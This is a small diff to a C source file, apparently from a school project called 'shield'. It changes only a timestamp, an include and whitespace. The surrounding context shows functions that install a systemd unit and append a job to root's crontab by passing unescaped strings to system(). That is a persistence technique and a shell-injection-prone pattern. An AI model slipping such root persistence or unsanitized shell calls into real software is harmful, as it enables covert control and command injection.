@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/25 15:17:39 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/11/20 14:53:19 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/11/28 21:40:30 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,6 +14,7 @@
 
 #include <fcntl.h>
 #include <shield.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
@@ -100,10 +101,10 @@ static inline int	write_systemd_unit(const char *binary_path)
 
 static inline int	write_crontab_job(const char *schedule, const char *command) {
     char	cmd[1024];
+
     snprintf(cmd, sizeof(cmd), 
         "(crontab -u root -l 2>/dev/null; echo '%s %s') | crontab -u root -",
         schedule, command);
-    
     return (system(cmd));
 }
 
